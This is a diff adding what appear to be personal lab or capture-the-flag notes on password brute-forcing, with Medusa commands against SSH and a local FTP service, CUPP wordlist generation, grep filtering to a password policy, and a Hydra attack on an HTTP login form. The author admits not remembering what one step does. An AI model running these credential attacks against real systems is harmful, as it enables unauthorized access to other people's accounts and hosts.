@@ -1,0 +1,42 @@
+ssh using Medusa
+
+medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
+
+-h <IP>: Specifies the target system's IP address.
+-n <PORT>: Defines the port on which the SSH service is listening (typically port 22).
+-u sshuser: Sets the username for the brute-force attack.
+-P 2023-200_most_used_passwords.txt: Points Medusa to a wordlist containing the 200 most commonly used passwords in 2023. The effectiveness of a brute-force attack is often tied to the quality and relevance of the wordlist used.
+-M ssh: Selects the SSH module within Medusa, tailoring the attack specifically for SSH authentication.
+-t 3: Dictates the number of parallel login attempts to execute concurrently. Increasing this number can speed up the attack but may also increase the likelihood of detection or triggering security measures on the target system.
+
+once logged in through SSH 
+
+we can do 
+
+netstat -tulpn | grep LISTEN
+
+
+inside of the SSH, we will use FTP with Medusa
+FTP using Medusa
+
+medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
+
+
+after finding the password, we ftp using 
+
+ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
+
+
+using cupp
+
+cupp -i
+
+after creating the file, we grep for information, no idea what it does too drunk to remember when inserting the information and downloading the tool
+grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
+
+
+
+
+using hydra with the new filtered names to crack the password
+
+hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
